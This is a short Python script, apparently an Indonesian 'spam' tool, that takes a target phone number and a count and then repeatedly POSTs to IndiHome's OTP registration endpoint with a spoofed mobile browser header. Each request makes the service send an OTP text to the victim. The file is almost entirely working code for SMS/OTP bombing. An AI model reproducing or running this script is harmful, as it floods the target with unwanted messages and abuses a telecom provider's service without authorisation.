import os,sys,time,requests
from requests import post
s = requests.Session()
os.system("clear")
def balik():
    f = input("\033[34;1mKEMBALI?\033[32;1m(y/t):\033[32;1m")
    if f == "y":
       os.system("python indi.py")
    elif f == "t":
         print ("\033[35;1mKELUAR!!\033[35;1m")
         sys.exit()
    else:
         print ("\033[31;1mINPUT SALAH!!\033[31;1m")
         time.sleep(2)
         balik()
banner = """
\t\033[1;92mTOOLS SPAM INDIHOME UNLIMITED
\033[31;1m___________________________________________
\t\033[33;1m sing gawe : sholayyy
\t\033[35;1m tim : SINTECH SMADA
\033[31;1m___________________________________________
"""
print (banner)
print ("")
no = input("\033[34;1mMASUKAN NOMER : \033[32;1m ")
jum = int(input("\033[34;1mJUMLAH SPAM:\033[32;1m "))
url = "https://sobat.indihome.co.id/ajaxreg/msisdnGetOtp"
ua = {
"Host": "sobat.indihome.co.id",
"Connection": "keep-alive",
"Accept": "*/*",
"user-agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
"accept-encoding": "gzip, deflate, br",
"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
}

dat = {
"type":"hp",

"msisdn": no
}
for i in range(jum):
    r = s.post(url, data=dat, headers=ua)
    print ("\033[35;1mPesan:\033[1;92m", r.json()["info"])
balik()
